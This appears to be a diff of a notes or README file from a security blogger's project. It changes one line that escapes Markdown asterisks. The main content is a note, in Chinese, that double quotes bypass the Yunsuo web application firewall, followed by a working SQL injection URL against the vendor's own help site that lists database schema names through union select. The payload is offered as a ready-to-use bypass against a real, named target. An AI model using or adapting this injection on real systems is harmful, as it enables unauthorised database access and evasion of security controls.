@@ -19,5 +19,5 @@ blog:https://pureqh.top/?p=1882<br>
 blog:https://pureqh.top/?p=4175<br>
 
 注：bypass云锁 使用双引号可以绕过官网检测
-http://help.yunsuo.com.cn/guide/install/?id=1' "/*" union select 1,group_concat(schema_name),2,3 from information_schema.schemata -- "*/"
+http://help.yunsuo.com.cn/guide/install/?id=1' "/\*" union select 1,group_concat(schema_name),2,3 from information_schema.schemata -- "\*/"
 
